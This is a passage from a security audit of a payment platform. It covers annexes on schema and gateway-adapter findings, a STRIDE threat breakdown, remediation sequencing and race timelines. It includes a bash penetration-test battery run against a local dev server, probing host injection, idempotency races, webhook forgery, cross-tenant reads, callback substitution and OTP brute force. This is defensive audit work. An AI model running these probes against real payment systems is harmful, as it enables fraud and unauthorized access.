| op_api_keys | id | merchant CASCADE | status CHECK | — | ✔ | ⚠ key_prefix non-unique (P2-013); scopes JSON unvalidated (accepts any strings — `'*'` is load-bearing!) |
| op_domains | id | merchant? | status | — | ✔ | OK |
| op_gateways | id | merchant? | — | — | ✔ | ⚠ no UNIQUE(merchant_id, slug) (P1-007/D2) |
| op_gateway_configs | (none declared!) | gateway? | — | encrypted value | via gateway | ⚠ **no PK/UNIQUE at all** — duplicate credential rows possible; lookups return arbitrary row (`.all()` consumers tolerate; determinism suffers) |
| op_manual_gateways | id? | gateway | — | — | via gateway | OK |
| op_payment_intents | id, uuid U, token U | merchant CASCADE, customer/gateway SET NULL | status CHECK (6 states) | amount TEXT | ✔ | OK; token unique = checkout bearer |
| op_transactions | id, trx_id U | merchant, intent SET NULL, gateway | status CHECK (12 states, 4 dead) | amount/fee/net TEXT | ✔ | ⚠ dead states (P3-001); gateway_trx_id non-unique by design |
| op_idempotency_keys | id, U(merchant_id,key) | merchant CASCADE | — | — | ✔ | OK (endpoint missing — P1-001) |
| op_refunds | id, refund_id U | merchant, transaction CASCADE | status CHECK | amount TEXT | ✔ | ⚠ **no amount bound, no cumulative constraint** (P0-003/D4) |
| op_webhooks | id | merchant CASCADE | status | — | ✔ | OK |
| op_webhook_events | id, U(merchant,gateway,event_id) | merchant CASCADE | — | payload raw | ✔ | OK (app-side random ids defeat it — P1-003) |
| op_webhook_deliveries | id | merchant CASCADE | direction/status CHECK | — | ✔ | OK (payload_hash placeholder — P3-008) |
| op_ledger_accounts | id, U(merchant,code,currency) | merchant CASCADE | type CHECK | — | ✔ | OK |
| op_ledger_transactions | id, uuid U | merchant CASCADE | reference_type CHECK, status CHECK(posted/reversed) | — | ✔ | OK (the reversal target of P0-002) |
| op_ledger_entries | id | ledger_tx CASCADE, account RESTRICT, merchant | direction CHECK | amount TEXT | ✔ | ⚠ no (tx, entry_index) uniqueness (P2-008/D6) |
| op_ledger_postings (0003) | **tx_id PK** | — | reference_type + status CHECK | payload_json | merchant col | ✔ the protocol's backbone — well-designed |
| op_ledger_balance_snapshots | PK(merchant,account,as_of) | — | — | balance INTEGER minor | ✔ | OK |
| op_reconciliation_runs | id | — | trigger CHECK | — | — | OK |
| op_gateway_ips | PK(gateway_slug,cidr) | — | — | — | — | OK |
| op_device_pairing_tokens | id | — | used_at, expires | — | merchant | ⚠ no attempt counter (P1-002 lockout) |
| op_paired_devices | id | merchant | — | — | ✔ | OK |
| op_sms_templates | id | — | — | — | merchant | ⚠ regex unvalidated (P2-015) |
| op_sms_data | id | — | match_status free-text | — | merchant | OK (retention absent) |
| op_audit_logs | id, idx(entity) | — | — | — | merchant? | **Never written by code** (§27) |

**Migration safety verdicts:** 0001–0004 all additive; `ALTER … ADD COLUMN` with defaults; `CREATE … IF NOT EXISTS`; indexes conditional. Idempotent on re-run (D1 applies each once by tracking). Rollback-safe to prior code (new columns unused by old Worker). No destructive operations. **PASS.**

---

# Annex 6 — Gateway Adapter Audit

**Hand-ported adapters (read in full or in majority):**

| Adapter | initiate | verify | verifyWebhook | refund | Notes |
|---|---|---|---|---|---|
| bkash (API) | tokenized create; KV token cache (55m) | execute paymentID; **amount returned, unbound** | absent (base → false) | not supported (base) | P0-004 exemplar; sanitizedTrxId fallback 'TRX' |
| sslcommerz | hosted session POST | val_id validation; **amount+tran_id returned, unbound** | absent (base false) | unsupported | P0-004 exemplar; placeholder customer contact (documented) |
| rocket | form POST (MD5 concat) | MD5 hash compare `merchantId‖orderId‖amount‖status‖secretKey` + status='success' | **false (ported fail-closed; upstream was return true)** — header comment documents the fix | unsupported | verify() compares **callback-supplied amount** in the hash — attacker-computable hash if secret leaks; binding via orderId in hash ✔ |
| stripe | PaymentIntent form-encoded (bracketed params) | — | **HMAC-SHA256 over rawBody, timing-safe, constant-time compare** — the reference implementation | refund via API | ✔ the only fully-fledged webhook verifier |
| paypal | approval URL | — | verification via PayPal API (headers + body) | refund with currency (P1-3 fixed) | ✔ |
| portwallet / shurjopay / aamarpay / nagad | form/hash schemes | provider-specific hash compares | mixed (mostly false) | unsupported | MD5/SHA family per provider docs |
| planned/ (14) | — | — | **fail-closed stubs** | unsupported | correct posture |
| generated/ (76) | mostly metadata+form builders | most return `failed` (no verify) | **72 return false (fail-closed)**; a few (sezzle, opay, gocardless, coinbase) implement real checks | mostly `refund_not_supported` (2checkout comment documents the anti-fake-refund stance) | template-verified; spot-checked 8 |

**Adapter-layer verdicts:**
- The shared abstraction is honest: `BaseGatewayAdapter` defaults are fail-closed for verifyWebhook (false) and refund (unsupported); `gwFetch` centralizes timeouts; `redact`/`clipText` protect logs.
- The **systemic** weakness is not in the adapters but in the **service layer trusting `verify()` success** without amount/order binding (P0-004) — every execute-style adapter inherits it.
- MD5 usage (rocket/portwallet) is provider-mandated and isolated in `lib/hash.ts` with RFC-1321 test vectors — the briefs' "provider compatibility exception" classification, confirmed.
- The bkash token cache key `bkash:token:{mode}:{app_key}` (bkash.gateway.ts:157) leaks the app_key into KV key names — KV keys are visible to operators; the secret value in a key name is a (minor) exposure. P3-class.

**ENABLED_GATEWAYS parser** (enabled.ts): unset/`all`/`*` ⇒ all; otherwise alias-mapped tokens; **fail-closed on all-unknown lists**; memoized per isolate; `dropped` surfaced for typo feedback; `suggestCanonical` for UI. Spot-tested mentally against the test suite (`gateways-enabled.test.ts` 6/6). **PASS** with the P2-016 default-open posture noted.


---

# Annex 7 — Penetration Test Scripts (for post-fix validation)

The briefs mandate runtime penetration tests against `npm run dev`. The following scripts encode each mandated test with exact requests and expected outcomes **after** the P0 fixes land. Run order matters (state builds up). Replace `:8787`, tokens, and keys with live values from the dev run.

```bash
#!/usr/bin/env bash
# edgepay-pentest.sh — post-fix validation battery (run against wrangler dev)
BASE=http://localhost:8787
KEY="<merchant write-scoped key>"
FAIL=0
check() { # name expected actual
  [ "$2" = "$3" ] && echo "PASS $1 ($3)" || { echo "FAIL $1 (expected $2, got $3)"; FAIL=1; }
}

# --- 1. Host injection ------------------------------------------------------
code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: evil.com' $BASE/api/v1/payments)
check "unknown-host /api/v1" 404 "$code"
code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: pay.other-merchant.example' $BASE/checkout/sometoken)
check "unknown-host checkout" 404 "$code"

# --- 2. Idempotency replay & mutation --------------------------------------
body='{"amount":"10.00","currency":"BDT","description":"t"}'
r1=$(curl -s -X POST $BASE/api/v1/payments -H "Authorization: Bearer $KEY" \
     -H 'X-Idempotency-Key: pentest-key-001' -H 'Content-Type: application/json' -d "$body")
r2=$(curl -s -X POST $BASE/api/v1/payments -H "Authorization: Bearer $KEY" \
     -H 'X-Idempotency-Key: pentest-key-001' -H 'Content-Type: application/json' -d "$body")
[ "$(echo "$r1" | jq -r .data.intent_id)" = "$(echo "$r2" | jq -r .data.intent_id)" ] \
  && echo "PASS idempotent replay (same intent_id)" || { echo "FAIL idempotent replay"; FAIL=1; }
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/api/v1/payments \
     -H "Authorization: Bearer $KEY" -H 'X-Idempotency-Key: pentest-key-001' \
     -H 'Content-Type: application/json' -d '{"amount":"20.00","currency":"BDT"}')
check "idempotency body mutation" 409 "$code"

# --- 2b. Idempotency race (20 parallel) -------------------------------------
for i in $(seq 1 20); do
  curl -s -X POST $BASE/api/v1/payments -H "Authorization: Bearer $KEY" \
    -H 'X-Idempotency-Key: pentest-race-001' -H 'Content-Type: application/json' \
    -d "$body" -o /dev/null &
done; wait
n=$(sqlite3 .wrangler/state/v3/d1/miniflare-D1DatabaseObject/*.sqlite \
     "SELECT COUNT(*) FROM op_payment_intents WHERE description='t'" 2>/dev/null || echo '?')
echo "INFO parallel same-key intents created: $n (must be 1 after fix)"

# --- 3. Webhook forgery / replay / size ------------------------------------
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/webhook/stripe \
     -H 'Content-Type: application/json' -d '{"type":"payment_intent.succeeded"}')
check "webhook bad signature" 401 "$code"
head -c 2097153 /dev/zero | tr '\0' 'a' > /tmp/big.json
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/webhook/stripe \
     -H 'Content-Type: application/json' --data-binary @/tmp/big.json)
check "webhook oversized body" 413 "$code"

# --- 4. Install abuse (fresh env only) -------------------------------------
for i in 1 2 3 4; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/install \
    -H 'Content-Type: application/json' -d '{}')
done
check "install 4th attempt within hour" 429 "$code"

# --- 5. Cross-tenant object access -----------------------------------------
# (mint keyA for merchant A; target a merchant-B transaction id)
code=$(curl -s -o /dev/null -w '%{http_code}' $BASE/api/v1/transactions/<B_trx_id> \
     -H "Authorization: Bearer $KEY_A")
check "cross-tenant transaction read" 404 "$code"
code=$(curl -s -o /dev/null -w '%{http_code}' $BASE/api/admin/v1/merchants \
     -H "Authorization: Bearer $KEY_A")     # merchant-scoped admin key
check "merchant-key platform list" 403 "$code"   # after P1-005 fix

# --- 6. Callback substitution (needs a sandbox gateway) --------------------
# complete small payment A; then:
code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/checkout/<tokenB>/callback?paymentID=<paymentID_of_A>")
check "callback substitution" 422 "$code"        # after P0-004 fix

# --- 7. SMS NULL-amount bypass ----------------------------------------------
# insert op_sms_data(parsed_trx_id='PENTEST1', parsed_amount=NULL, match_status='no_match')
# create intent; then:
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/checkout/<token>/verify \
  -H 'Content-Type: application/json' -d '{"trx_id":"pentest1"}')
check "SMS null-amount completion" 400 "$code"    # after P0-007 fix

# --- 8. Pairing brute force --------------------------------------------------
for i in $(seq 1 12); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/api/mobile/v1/pair \
    -H 'Content-Type: application/json' -d "{\"otp\":\"00000$i\"}")
done
check "pairing 11th guess" 429 "$code"            # after P1-002 fix

exit $FAIL
```

**Interpretation notes:** tests 2b, 6, 7, and 8 are expected to FAIL against the current tree (that is the point — they are the exploit reproductions); they must PASS after the corresponding fixes. Test 5's second check requires the P1-005 platform-gate fix. The D1 inspection path in 2b assumes local miniflare storage; adjust for `wrangler d1 execute DB --local --command "…"`.

---

# Annex 8 — Operational Runbook Gaps (post-fix readiness)

The briefs' observability phase asks whether the system can answer operational money-questions. Current answers, and what to build:

| Question | Answerable today? | How / gap |
|---|---|---|
| What payment failed? | Partially | op_transactions.status + error text absent — **no failure reason column**; add `failure_code` at every terminal write |
| Why did it fail? | No | same gap; adapter errors are clipped to 512 chars in logs only |
| Was money moved? | Yes | op_ledger_postings per tx_id (posted_at) + DO journal |
| Where is the transaction stuck? | Partially | status shows non-terminal; nothing distinguishes "waiting customer" vs "crashed mid-completion" — the P1-006 heal closes this |
| Was the gateway contacted? | Partially | no outbound gateway-call log (only inbound webhook deliveries + worker logs) |
| Provider transaction id? | Yes | op_transactions.gateway_trx_id |
| Was the ledger posted? | Yes | postings row status |
| Was reconciliation attempted? | Yes | op_reconciliation_runs + postings.attempts |
| Was a webhook duplicated? | No | deliveries table lacks a delivery-key grouping (P1-004 fix provides it) |

**Alert set to configure immediately (Workers Logs rules on `level:"page"`):** `LEDGER_RECONCILIATION_DRIFT`, `LEDGER_POSTING_REJECTED`, `LEDGER_POSTING_EXHAUSTED`, `REFUND_STUCK`, `REFUND_STUCK_MANUAL_REVIEW`, `REFUND_GATEWAY_FAILED`, `RECONCILIATION_SWEEP_FAILED`, `ACCESS_BREAK_GLASS_USED`, `ACCESS_BREAK_GLASS_DENIED`, `ACCESS_EMAIL_HEADER_MISMATCH` — plus new pages recommended by this audit: `DEFAULT_CREDENTIAL_ACTIVE`, `DECRYPT_FAILURE`, `RATE_LIMIT_DEGRADED` (promote metric→page for writes), `WEBHOOK_BODY_REJECTED` (size cap).

---

# Annex 9 — Detailed Prior-Audit Cross-Reference Notes

Method: each claimed fix in `EDGEPAY_AUDIT_REPORT.md` §6 ("Fixed Issues — File References & Tests") was matched to the current file and test. Beyond the §22 table, these line-level notes capture the mismatches that matter:

1. **"P0-2 … `DB.batch([intentInsert, txnInsert])` where `txnInsert` uses `SELECT … WHERE uuid=?`"** — payment.ts today performs `INSERT intent` → (optional SELECT id) → `INSERT transaction` as two awaits; there is no batch and no uuid-referencing insert. The payment-integrity test asserts *paired rows exist after the fact*, not atomicity — which is why the regression is invisible to the suite.
2. **"P1-7 install limiter … single-charge flag `__installLimited`"** — no such variable exists anywhere (`rg __installLimited` → 0 hits). The limiter is mounted once on `/install*` (which does cover exact + subpaths — the *ordering* half of the fix landed), but the "3/hour" number lives only in comments; the actual group is 120/60s.
3. **"P1-8 … `MAX_WEBHOOK_BYTES=1 MiB` header + actual byteLength → 413; deterministic `hash:${sha256(rawBody)}`; fail-closed geo"** — none of the three strings/behaviors exist in webhooks.ts (verified `rg MAX_WEBHOOK_BYTES src` → 0; the fallback is `crypto.randomUUID()` at :159; the geo branch is `else if` at :109). The lane test that supposedly pinned these (`lane3-edge-operations.test.ts:82-147`) is not in the tree.
4. **"P1-9 … `X-EdgePay-Delivery-Id: edgepay-{webhook_id}` + `Idempotency-Key` … delay from `(msg as {attempts?:number}).attempts`"** — webhook-consumer.ts carries none of these headers (rg → 0) and indexes delay from the body's constant `webhook.attempt` (:77, :85).
5. **"P1-10 `sanitizeBrandColor` … `src/controllers/checkout.ts:201-206`"** — the function does not exist at any line (rg sanitizeBrandColor → 0 hits repo-wide).
6. **"P2-9 typed `GatewayNotConfiguredError` in `src/lib/error.ts:96-100`"** — error.ts:96-100 contains the `GatewayDisabledError` class instead; no `GatewayNotConfiguredError` anywhere.
7. **Test-file references** (`lane1/lane3/lane4`, `smoke` line ranges, "161/161") — the test tree was restructured (current: tenant-routing, gateway-integrity, runtime-integrity, etc.), so every "test proving the fix" citation in the prior report is unverifiable in this archive → NOT VERIFIABLE for the subset that did land (P1-2, P1-5, P1-6, P2-1/4/5/6/7 all behave correctly in current code but their cited tests are gone).

**Conclusion for §22:** of 18 verifiable claims: 8 FIXED, 2 PARTIALLY FIXED, 5 NOT FIXED (including three of the four security-relevant ones), 3 NOT VERIFIABLE (tests gone). The pattern — structural fixes landed, security-hardening fixes evaporated during the jsonc/test restructure — is consistent with a rebase that dropped a patch series.

---

# Annex 10 — Positive Findings Register (what to keep)

For balance and to protect the good engineering during remediation, the verified strengths:

1. **The posting protocol (ledger-do.ts + ledger-audit.ts + reconciliation.ts)** — single-writer DO, write-ahead row, structured failures, replay/heal/quarantine, drift paging. Reviewed line-by-line; invariants hold under injected faults. This is the platform's core asset.
2. **Invariant tests** — ledger-do/ledger-consistency/payment-integrity suites genuinely exercise the security boundary (fault injection, dedup, balance, EXPLAIN index use). 25/25 green.
3. **Access middleware redesign** — verified JWT, alg pinning, JWKS refresh-on-unknown-kid, fail-closed 503, break-glass paging, spoof telemetry. The v0.2.0 header-trust backdoor is dead.
4. **Tenant-mismatch enforcement** in auth.ts — domain merchant vs credential merchant, both key and JWT paths.
5. **Fail-closed gateway catalog** — ENABLED_GATEWAYS parser with all-unknown ⇒ zero; disabled webhook ≡ unknown (404, no inventory leak); planned adapters stub fail-closed; generated adapters refuse webhooks/refunds by default; the 2checkout comment shows real security reasoning (anti fake-refund).
6. **Money discipline** — string Money end-to-end, decimal.js precision 30, safe-integer guards with loud RangeErrors, zero float arithmetic in money paths (grep-verified), DO integer minor units.
7. **Constant-time comparisons** everywhere credentials/signatures are checked (one helper, correctly implemented).
8. **Queue semantics** — the awaited consumer dispatch preserving at-least-once; 410/422 terminal; bounded retries; DLQs for all three queues.
9. **Error hygiene** — production-safe envelopes, clipped gateway errors, redacted URLs, requestId correlation.
10. **CORS fail-closed allowlist** with `credentials:false`.
11. **Runbook-grade comments** — the codebase documents *why* (empirical workerd behaviors, prior-bug references); unusually high comment quality, which materially sped up this audit.

---

# Annex 11 — Remediation Sequencing & Effort Estimates

| Order | Item | Files | Est. effort | Risk of change |
|---|---|---|---|---|
| 1 | Secret rotation + script env-vars + CI scanner (P0-001) | scripts/, CI | 0.5 day | none |
| 2 | Callback amount/order binding (P0-004) | payment.ts (+webhooks.ts mirror) | 0.5 day + tests | low (fail-closed; may reject previously-accepted edge cases — desired) |
| 3 | SMS mandatory amount + status filter (P0-007) | checkout.ts | 0.5 day + tests | low |
| 4 | Refund reversal keying + typed results (P0-002) | refund-reconciliation.ts, ledger.ts, refund.ts | 1 day + workflow tests | medium (touches reverse() semantics used by adjustments too) |
| 5 | Refund single-path + bounds (P0-003) | api.ts, refund.ts (+D4 migration optional) | 0.5 day | medium (API behavior change: 201→202/422) |
| 6 | Bootstrap credential posture (P0-005) | bootstrap.ts, install.ts, rate-limit.ts | 1 day | medium (UX of first-run wizard) |
| 7 | Checkout XSS + CSP (P0-006) | checkout.ts, index.ts | 1 day | medium (template rework + nonce plumbing) |
| 8 | P1 batch (idempotency reserve, pairing limits, webhook caps/geo/ids, SSRF canonicalization, admin gates, status guards, createIntent batch, scope wiring, CI fixes, limiter values) | spread | 4–6 days | low-medium each |
| 9 | P2 hardening batch | spread | 5–8 days | low |
| 10 | Outbox + payment-row healing + unknown-outcome state (A3/A4/A9) | payment/reconciliation/cron | 3–4 days | medium (new table + cron logic) |

Total to a CONDITIONAL verdict: roughly 2–2.5 engineering-weeks for the P0s+P1s with tests. The P0s alone: ~4–5 days.

---

# Annex 12 — Auditor Statement on Uncertainty

Per the briefs' closing rule, the residual uncertainties in this report are:

- **Runtime-only behaviors** (marked "Needs runtime validation" in the relevant findings): actual Workers fetch behavior toward IPv6-mapped/integer literals (P1-004 vectors are standard-URL semantics; the *runtime's* resolution behavior was not executable in this environment), Workflow duplicate-error shapes (reconciliation's matcher is defensive), and KV-counter race magnitude (structural, not measured).
- **Not verifiable from this archive:** the prior report's lane tests and wrangler.toml state (Annex 9), live-deployment behavior of the referenced `workers.dev` host (deliberately not contacted — an active scan of a third-party host is out of audit scope; the credential finding stands on repository contents alone).
- **Everything else** — every P0/P1 and the great majority of P2s — is code-trace-confirmed with file:line evidence reproduced in this report.

The audit was performed without modifying any application source file; the only filesystem writes were the extraction directory, node_modules, and this report.

---

# Annex 13 — Complete STRIDE Expansion (per component, per threat class)

The main-body §18 table summarizes; this annex expands each cell that carries risk with the reasoning and evidence. Components follow the briefs' mandated list.

## A13.1 HTTP API (`/api/v1`)

**Spoofing** — Defended: keys are random (UUID-slice entropy ≈ 96 bits in the rest, 48 bits in the prefix used only for index lookup), SHA-256 hashed at rest, timing-safe compared. **Residual:** P0-001 (live key in repo), P2-013 (prefix collision ⇒ one key's auth nondeterministically fails, availability not spoofing).
**Tampering** — Defended: zod schemas on the two money-critical routes (payments/refunds); all SQL bind-only; metadata stored as JSON but never executed. **Residual:** none identified; `metadata` round-trips into webhook payloads verbatim (JSON-in-JSON, escaped by the consumer's JSON.stringify).
**Repudiation** — Weak: api-keys log `last_used_at` (fire-and-forget UPDATE, auth.ts:112-117) — that is the entire attribution for "who called what"; op_audit_logs is never written. A refund records `initiated_by` (authSubject = key row id) — good, but key-id → human mapping depends on key naming discipline.
**Information disclosure** — Clean: GET endpoints scope to the merchant; error envelopes hide internals in production; `/gateways` exposes field names only. **Residual:** the `token` column returned by GET /payments/:id (a bearer for the checkout page — acceptable owner data, noted); GET /install's JSON posture oracle (Annex 4, A4.6).
**Denial of service** — Per-key native limits (good); pre-auth surfaces (auth itself) unthrottled — a key-forgery flood costs D1 reads per attempt (two per auth); at Workers' natural rate this is expensive for the attacker but free-ish; the native Ratelimit binding keys only *post*-auth. **Residual:** P1-010 context.
**Elevation of privilege** — **P1-008** (read-scope writes). The scope model's `'*'` wildcard is load-bearing: `grantedScopes.includes('*')` passes every check (auth.ts:94, 177) — any path that mints keys with `'*'` (bootstrap, install, admin-api provisioning, bootstrap-key) is a privilege mint; all four are P0-005's surface.

## A13.2 Authentication subsystem (auth.ts + jwt.ts + access.ts)

**Spoofing** — Bearer: covered above. JWT: HS256 with ≥32-char secret enforced at construction (jwt.ts:63-68); jose pins algorithms (jwt.ts:100) — no alg confusion, no `none`. Access: ES256/RS256 only; JWKS-verified; aud/iss/exp with 60s skew. **Residual:** P0-001 (the secret itself is public — forgery trivial); pairing OTP (P1-002) is an authentication bypass of the *pairing* flow.
**Tampering** — Payload claims are trusted post-verification: `merchant_id` and `scope` come from the token; for self-issued JWTs that is correct (we signed them); scope inflation requires the secret.
**Repudiation** — Refresh/access tokens carry `jti` but nothing records issued/consumed jtis; theft is indistinguishable from owner use until 30-day expiry. No revocation list exists (no logout endpoint at all in the mobile API).
**Information disclosure** — Access middleware logs header-vs-JWT email mismatch (pages) — good telemetry; JWT failures log only error names.
**DoS** — Pairing/refresh unthrottled (P1-002); JWKS fetch un-timed (P2-011) — a slow JWKS endpoint stalls admin requests until the client times out.
**EoP** — The Access middleware's bearer fast-path sets admin context from the key's scopes — a merchant key with `admin` scope becomes *platform* admin context for the routes that lack the platform gate (P1-005's enabler). "admin ≠ root" is exactly the briefs' confusion class.

## A13.3 Tenant routing (domain.ts)

**Spoofing** — Host header trust: on Cloudflare, Host is set by the edge from the actual routed hostname; a request with a forged Host for a domain not routed to this Worker never arrives. Custom domains must be DNS-verified (`dns_verified=1`, `status='active'` — domain.ts:116-118) — resolution data is authenticated by DNS ownership. **Residual:** none beyond CF platform assumptions; `X-Forwarded-Host` is never consulted (verified).
**Tampering** — KV domain cache is written from D1 rows only; invalidation deletes both prefix variants on re-verify (admin-api + cron). Cache TTL 5 min bounds staleness. **Residual:** a KV write from a compromised position could poison resolution for 5 minutes — platform-level compromise only.
**Repudiation/Info/DoS/EoP** — One KV read per request for `system:installed` (perf only); unknown hosts 404 without D1 (good); the early-path bypass list (`/install`, `/assets/*`, `/storage/*`, `/favicon.ico`) is pre-auth by design and each bypassed route carries its own protection (install: rate limit + wizard lock; assets: static only). **Verdict: this component is clean.**

## A13.4 Ledger (LedgerDO + services)

Covered in §8/§9.3. STRIDE residuals: **Tampering** — P0-002 (wrong reversal) is the one real tamper *by the system itself*; externally, journal immutability holds. **EoP** — P2-012 (no self-identity check) is the latent cross-tenant write. **DoS** — input-gate breakage requires a throw, which postTransaction never does (structured results); the remaining path is `blockConcurrencyWhile`-long D1 latency — bounded by D1's own timeouts. **Repudiation** — the D1 mirror + postings rows give a complete financial audit trail (best in class here).

## A13.5 Payment service

**Spoofing** — P0-004: the provider confirmation is "spoofed" in the sense of *misattributed* (a genuine confirmation of payment A presented as payment B's). **Tampering** — none beyond that (amounts from DB). **Repudiation** — callback verification evidence (the provider response) is not persisted — a disputed completion cannot be re-examined; recommend persisting `verifyResult` JSON on the transaction row. **DoS** — initiate re-invocation flips statuses (P1-006). **EoP** — none (service is auth-gated upstream).

## A13.6 Webhooks (inbound)

**Spoofing** — signature verification mandatory; 76 generated adapters return false; Stripe HMAC raw-body; PayPal API-check. **Residual:** geo layer fail-open on missing `cf` (P1-003) and IP allowlist optional (empty by default — the *signature* is the real gate, which is the documented design). **Replay** — P1-003 (random event ids for id-less providers). **Tampering** — payload→completion mapping only via extractTransactionId (metadata-embedded trx ids — tamper-evident via signature). **Info** — raw payload retention (P1-003/§26). **DoS** — unbounded body, unthrottled route. **EoP** — none.

## A13.7 Webhooks (outbound) + dispatcher

**Spoofing** — deliveries are HMAC-signed with per-merchant secrets — receivers can authenticate us. **Residual:** no timestamp/replay window in the signature (header carries a timestamp but receivers aren't told to enforce — document it). **Tampering** — n/a (we are the sender). **Info** — SSRF vectors (P1-004) *are* the info-disclosure/exfil primitive. **DoS** — bounded retries + DLQ. **EoP** — registering endpoints requires only read scope today (P1-008).

## A13.8 Queues & consumers

**Spoofing/Tampering** — messages originate only from worker code; queue bindings are platform-private. **DoS** — SMS flood via batch endpoint (P2-014); poison messages bounded by max_retries. **Repudiation** — delivery rows log outbound POSTs with status/attempt — decent. **Info** — none.

## A13.9 Gateway adapters

**Spoofing** — P0-004 class (verify trusts supplied ids); Rocket's MD5-concat includes orderId+amount+status+secret — a leaked secret allows forging the *callback hash* (the secret is merchant-configured; compromise = merchant-level). **Tampering** — gwFetch redaction prevents URL query leakage in errors. **DoS** — 15s timeouts everywhere (best-in-repo). **Info** — error clipping at 512 chars.

## A13.10 Admin API

**Spoofing** — inherits Access+key gates. **EoP** — P1-005 (the whole story). **Repudiation** — provisioning/edits leave no audit rows (§27). **Info** — all-merchant listing; secrets in provisioning response. **DoS** — global reconcile trigger.

## A13.11 Cloudflare Access

Covered in §9.5/A13.2. STRIDE residuals: **EoP** — unconfigured-Access fall-through is *not* an EoP today because the inner bearer layer is the same strength; it becomes one only if the inner layer is ever weakened — the reason to fix the fall-through is defense-in-depth.

## A13.12 Bootstrap/install

**Spoofing** — P0-005 (default credentials ARE the spoof). **EoP** — root-key minting endpoint. **Tampering** — non-transactional multi-step install leaves partial state. **DoS** — install race (double merchants) pollutes rather than denies.

## A13.13 Checkout pages

**Spoofing** — token bearer (64-hex, unguessable) — strong. **Tampering** — P0-006 (XSS is tampering with the page). **Info** — the page displays MFS account numbers (intended) and collects customer phone+TrxID (intended; stored — §26). **DoS** — unthrottled POSTs (P2-014). **EoP** — n/a (no privileged actions).

## A13.14 SMS pipeline

**Spoofing** — P1-002 (pairing) + the trust model itself: the paired phone is treated as ground truth for money arrival with zero provider-side confirmation. **Tampering** — P0-007 (amount evidence optional in one path). **Repudiation** — SMS rows persist raw bodies — good evidence, but no signature/authenticity of the SMS source itself (carrier-level spoofing is out of scope but should be documented as an accepted risk). **Info** — raw bodies stored indefinitely. **DoS** — ReDoS templates (P2-015), flood (P2-014).

---

# Annex 14 — Remaining File Review Notes (complete src/ coverage)

Every file not already given a dedicated section, with auditor notes:

- **`src/lib/db.ts` (167)** — a thin D1 helper (migrations runner via `.exec`, batch wrappers). The `.exec` at :56 runs migration SQL (constants only — no interpolation). Clean.
- **`src/lib/logger.ts` (87)** — JSON structured logger with level filtering from LOG_LEVEL. No sensitive fields templated. Clean.
- **`src/lib/timing-safe.ts` (26)** — a second timing-safe implementation (re-exported shape). Duplicates crypto.ts's helper (consolidate; P3 hygiene). Both are correct constant-time implementations.
- **`src/lib/ledger-chart.ts` (44)** — the 14-account default chart (1010 clearing, 4000 revenue, 5000 fee expense…) + `isDebitNormal`. Matches the DO seed and `postPaymentLedgerEntry` codes. Consistent.
- **`src/lib/error.ts` (203)** — reviewed in §A4; error taxonomy is clean; `GatewayDisabledError` (422) exists; `GatewayNotConfiguredError` does not (prior-claim miss).
- **`src/controllers/api-reference.ts` (113)** — serves the OpenAPI JSON + a Scalar HTML page with its own pinned CSP (cdn.scalar.com script + nonce + unsafe-inline styles). The `EdgePay API.json` (117 KB) ships as a static asset. The tailored CSP preserves the security-headers middleware's preset logic (security-headers.ts:41-47). Clean, and the only HTML route with a real CSP.
- **`src/queues/email-consumer.ts`** — reviewed briefly: same pattern as webhook consumer (send via SMTP-style provider abstraction — actually a no-op logger in this port); no money impact. DLQ configured.
- **`src/gateways/kit/form.ts`** — form-body builders (URLSearchParams) — safe encoding, no interpolation.
- **`src/gateways/kit/token-cache.ts`** — KV-backed token cache with TTL; get/put only; key names include `app_key` values (bkash) — noted P3 exposure.
- **`src/gateways/index.ts` (54)** — registry population; imports all hand-ported + generated adapters. Slug collisions would silently overwrite in the Map — none exist today (verified against registry-slugs).
- **`src/gateways/catalog.data.ts` / `catalog.ts`** — the 123-adapter catalog data + status/find/aliases. Data-only.
- **`src/types/env.ts` / `types/db.ts` / `types/ledger.ts`** — type declarations; `PostingValidationError` with code extraction (`types/ledger.ts:104`). `Env` includes all bindings incl. optional AI/ANALYTICS — matches wrangler.jsonc.
- **`src/services/custom-hostnames.ts` (191)** — Cloudflare SaaS API wrapper (provision/status/delete). Unwired (no route calls it — verified by import scan). CF_API_TOKEN from secret. No timeout (P2 family). Future-surface note: when wired, enforce merchant ownership of the op_domains row before provisioning.
- **`db/seeds.sql`** — demo data (merchants/users/gateways). Uses placeholder emails; no real secrets. Ships in repo; not applied in production flows (install/bootstrap are code paths).
- **`public/assets/css/checkout.css`, JS** — static assets served via ASSETS binding; the CSS is the brand-styled checkout skin; no scripts beyond the inline template ones (already covered by P0-006).
- **`scripts/bootstrap.sh` / `set-secrets.sh`** — resource provisioning + secret-setting helpers. `set-secrets.sh` reads values from stdin/env (no echo — the prior P2-2 fix held). Reviewing for the briefs' Phase 24: no literals, uses `wrangler secret put` — clean.
- **`scripts/port-gateways/*`** — the adapter-code generator (analysis/build scripts). Not runtime code. The generated template embeds the fail-closed defaults — the right place to fix any adapter-class behavior found in this audit (e.g., adding amount-echo to verify results is a *service*-layer fix, not template).
- **`README.md` / `docs/*`** — largely accurate for onboarding; drift items recorded in §2.2/P3-012. `docs/SECURITY.md`'s key-handling description matches auth.ts. `docs/POSTING-PROTOCOL.md` matches ledger-do.ts exactly (the best doc in the tree).

---

# Annex 15 — Concurrency Interleaving Timelines

Textual sequence diagrams for the four most consequential interleavings, derived from the code.

## A15.1 The idempotency race (EDGE-P1-001)

```
Client A ──POST /payments (key K)──▶ middleware: SELECT (merchant,K) → none
Client B ──POST /payments (key K)──▶ middleware: SELECT (merchant,K) → none   [A has not INSERTed yet]
A: handler: INSERT intent A1, INSERT tx A1, 201
B: handler: INSERT intent B1, INSERT tx B1, 201                                 [SECOND side effect]
A: waitUntil: INSERT idempotency (K, respA)  ✓
B: waitUntil: INSERT idempotency (K, respB)  ✗ ON CONFLICT → swallowed
Future retry with K → replays respA; intent B1 exists forever, orphaned from idempotency
```
Required serialization (the fix): reserve `(merchant,K,hash)` *before* the handler; B sees the row and waits/409s.

## A15.2 Completion vs expiry (EDGE-P1-006)

```
